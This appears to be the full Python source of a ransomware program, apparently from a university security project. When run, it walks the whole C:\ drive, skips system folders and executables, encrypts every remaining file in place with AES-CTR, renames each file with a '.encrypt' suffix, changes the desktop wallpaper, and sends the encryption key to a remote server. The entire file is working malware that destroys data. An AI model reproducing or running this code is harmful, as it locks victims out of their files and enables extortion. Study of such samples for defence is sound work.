from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util import Counter
import os
from change_wallpaper import changeWallpaper
from communication import send_key
'''
    Utilizaremos CTR mode porque es paralelizable 
    y no muestra patrones como ECB
'''

extension = ".encrypt"
forbidden_paths = [r"C:\Program Files", r"C:\Program Files (x86)", r"C:\Windows", r"C:\Boot", r"C:\ProgramData", r"C:\$Recycle.Bin"]
forbidden_extensions = [extension, ".exe"]
max_size = 314572800 #300MB

url = 'http://serverfag.gast.it.uc3m.es:8080'

def getKey():
    key = get_random_bytes(32) 
    return key


def add_to_filelist(path):

    for f_path in forbidden_paths:
        if os.path.commonpath([f_path, path]) == f_path:
            return False
    
    for extension in forbidden_extensions:
        if path.endswith(extension):
            return False
    
    if os.path.getsize(path)> max_size:
        return False
    
    return True

def get_fileList(path):
	filelist = []
	for root, dirs, files in os.walk(path, topdown=False):
		for name in files:
			if add_to_filelist(os.path.join(root,name)):
				filelist.append(os.path.join(root, name))

	return filelist

def encrypt(filename, key):
  try:       
    file = open(filename,"rb")
    data = file.read()
    file.close()
    ctr = Counter.new(128)

    encrypt_object = AES.new(key, AES.MODE_CTR, counter=ctr)
    ciphertext = encrypt_object.encrypt(data)

    file = open(filename,"wb+")
    file.write(ciphertext)
    file.close()
    os.rename(filename, filename + extension)
  except:
    pass


def encrypt_all_files(path, key):

	filelist = get_fileList(path)
	for filename in filelist:
		encrypt(filename,key)


key = getKey()
path = "C:\\" 
encrypt_all_files(path, key)
changeWallpaper(url)
send_key(key, url)